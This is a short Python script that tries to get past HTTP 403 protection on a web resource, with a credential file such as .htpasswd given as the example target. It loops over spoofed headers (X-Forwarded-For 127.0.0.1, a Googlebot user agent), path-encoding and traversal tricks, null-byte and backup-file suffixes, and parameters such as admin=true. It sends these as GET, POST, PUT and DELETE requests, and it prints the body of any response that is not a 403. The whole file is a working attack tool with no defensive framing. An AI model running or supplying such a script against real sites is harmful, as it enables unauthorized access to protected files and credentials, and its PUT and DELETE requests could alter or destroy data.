import requests

def main():
    full_url = input("Enter the full URL to the forbidden resource (e.g., https://example.com/.htpasswds): ").strip()
    url_parts = full_url.split('/')
    domain = url_parts[2]
    resource = '/'.join(url_parts[3:])
    base_url = f'https://{domain}/'

    # List of headers to try
    headers_list = [
        {'User-Agent': 'Mozilla/5.0'},
        {'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)'},
        {'Referer': f'https://{domain}'},
        {'X-Forwarded-For': '127.0.0.1'},
        {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36'},
        {'User-Agent': 'curl/7.68.0'}
    ]
    url_variations = [
        full_url,
        base_url + '%2e' + resource,
        base_url + '.HT' + resource[2:],
        base_url + '/../' + resource,
        full_url + '%00',
        full_url + '/',
        full_url + '.bak',
        full_url + '.old',
        full_url.replace(resource, resource.replace('/', '%2F')),
        base_url + resource.replace('.', '%2e'),
        full_url + '?id=1',
        full_url + '?admin=true',
        full_url + '?debug=true',
        base_url + resource + '?anything=here',
        full_url.replace('https://', 'http://')
    ]
    methods = ['GET', 'POST', 'PUT', 'DELETE']
    for method in methods:
        for headers in headers_list:
            for test_url in url_variations:
                try:
                    print(f'Trying {method} URL: {test_url} with headers: {headers}')
                    if method == 'GET':
                        response = requests.get(test_url, headers=headers, timeout=10)
                    elif method == 'POST':
                        response = requests.post(test_url, headers=headers, timeout=10)
                    elif method == 'PUT':
                        response = requests.put(test_url, headers=headers, timeout=10)
                    elif method == 'DELETE':
                        response = requests.delete(test_url, headers=headers, timeout=10)
                    print(f'Status Code: {response.status_code}')
                    if response.status_code != 403:
                        print(f'Content: {response.text}')
                    else:
                        print('Access forbidden, 403 error.')
                except requests.RequestException as e:
                    print(f'Error: {e}')

if __name__ == "__main__":
    main()
